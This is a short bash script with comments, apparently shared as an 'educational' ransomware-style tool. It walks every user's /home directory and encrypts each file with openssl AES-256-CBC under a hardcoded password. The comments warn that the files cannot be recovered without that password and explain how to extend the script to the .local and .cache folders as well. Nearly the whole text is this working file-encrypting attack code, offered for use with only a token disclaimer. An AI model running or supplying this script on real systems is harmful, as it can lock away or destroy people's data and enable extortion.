#!/bin/bash
sleep 3s
find /home -type f -not -path "/home/*/.local/*" -not -path "/home/*/.cache/*" -exec openssl enc -aes-256-cbc -salt -in {} -out {}.encrypted -pass pass:YourPassword \;


//Change the password with your password
//This code will search for all files within the /home directory, excluding the .local and .cache directories, and encrypt them using the specified password. Please note that this will permanently encrypt the files and they will not be recoverable without the password.
//Use it for only educational purposes 
//If you want to encrypt .local and .cache as well then remove -not -path "/home/*/.local/*" -not -path "/home/*/.cache/*" from script but then try it on your own responsibility.
